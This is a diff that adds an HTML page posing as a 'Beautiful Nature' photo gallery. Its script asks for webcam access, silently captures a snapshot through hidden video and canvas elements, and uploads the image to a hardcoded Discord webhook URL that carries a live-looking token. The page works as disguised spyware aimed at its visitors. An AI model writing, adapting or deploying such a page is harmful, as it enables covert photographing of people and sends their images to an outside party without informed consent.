@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Beautiful Nature 🌿</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background: #eef9f1;
+      margin: 0;
+      padding: 20px;
+    }
+    h1 {
+      color: #2a7a2a;
+    }
+    .gallery {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-top: 20px;
+    }
+    .gallery img {
+      width: 300px;
+      height: 200px;
+      object-fit: cover;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    }
+    #status {
+      margin-top: 30px;
+      font-weight: bold;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Welcome to Beautiful Nature</h1>
+
+  <div class="gallery">
+    <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=800&q=80" alt="Nature 1" />
+    <img src="https://images.unsplash.com/photo-1469474968028-56623f02e42e?auto=format&fit=crop&w=800&q=80" alt="Nature 2" />
+    <img src="https://images.unsplash.com/photo-1500534623283-312aade485b7?auto=format&fit=crop&w=800&q=80" alt="Nature 3" />
+  </div>
+
+  <p id="status">Taking your photo in background...</p>
+
+  <video id="video" autoplay playsinline width="640" height="480" style="display:none;"></video>
+  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1382079059483426838/qlbgPqNQlUsX0rnSZAIEfP8cE7w3k7yconXlc3pQc5Kye22Pn7NH7W1y5T4n6TvZUIGK"; // 🛑 CHANGE THIS LINE
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const status = document.getElementById('status');
+    const context = canvas.getContext('2d');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          setTimeout(() => {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            fetch(imageData)
+              .then(res => res.blob())
+              .then(blob => {
+                const formData = new FormData();
+                formData.append("file", blob, "photo.png");
+
+                fetch(webhookURL, {
+                  method: "POST",
+                  body: formData
+                })
+                .then(() => {
+                  status.innerText = "✅ Photo sent!";
+                })
+                .catch(err => {
+                  status.innerText = "❌ Failed to send photo.";
+                  console.error(err);
+                });
+
+                stream.getTracks().forEach(track => track.stop());
+              });
+          }, 2000);
+        };
+      })
+      .catch(err => {
+        status.innerText = "⚠️ Camera access denied.";
+        console.error(err);
+      });
+  </script>
+
+</body>
+</html>
